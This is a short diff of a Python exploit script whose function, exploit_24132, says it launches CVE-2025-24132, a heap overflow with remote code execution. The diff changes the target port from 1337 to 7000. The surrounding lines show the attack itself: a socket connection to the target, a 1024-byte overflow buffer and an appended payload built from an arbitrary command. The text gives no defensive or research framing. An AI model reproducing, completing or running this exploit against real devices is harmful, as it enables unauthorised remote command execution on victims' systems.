@@ -48,7 +48,7 @@ def exploit_24132(target_ip, command):
     print(f"[*] Launching CVE-2025-24132 (Heap Overflow + RCE)...")
 
     try:
-        sock = socket.create_connection((target_ip, 1337), timeout=5)
+        sock = socket.create_connection((target_ip, 7000), timeout=5)
         overflow = b"A" * 1024
         payload = generate_payload(command)
         full_payload = overflow + b"\n" + payload + b"\n"
